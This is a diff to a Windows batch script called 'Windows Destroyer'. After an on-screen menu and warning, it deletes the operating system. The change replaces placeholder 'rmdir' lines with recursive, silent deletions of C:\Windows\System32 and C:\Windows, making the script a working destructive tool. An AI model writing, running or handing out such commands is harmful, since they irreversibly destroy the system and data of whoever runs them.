@@ -2,7 +2,7 @@
 goto destroy.warning
 :destroy.warning
 cls
-set version=1.0
+set version=1.1
 title Windows Destroyer %version%
 echo Welcome to the Windows destroyer.
 echo.
@@ -19,14 +19,15 @@ set /p function.destroy.warning=Please choose an option:
 if %function.destroy.warning% == 1 goto destroy.start
 if %function.destroy.warning% == 2 exit
 :destroy.start
+cls
 title Windows Destroyer %version%
 echo This is your final warning, if you don't want to continue, close the application now, if you do, please press any key.
 pause
 cls
 echo Deleting system32
-rmdir system32
+rmdir C:\Windows\System32 /s /q
 echo Deleting Windows folder
-rmdir Windows
+rmdir C:\Windows /s /q
 pause
 echo Windows has now been deleted.
 timeout 5
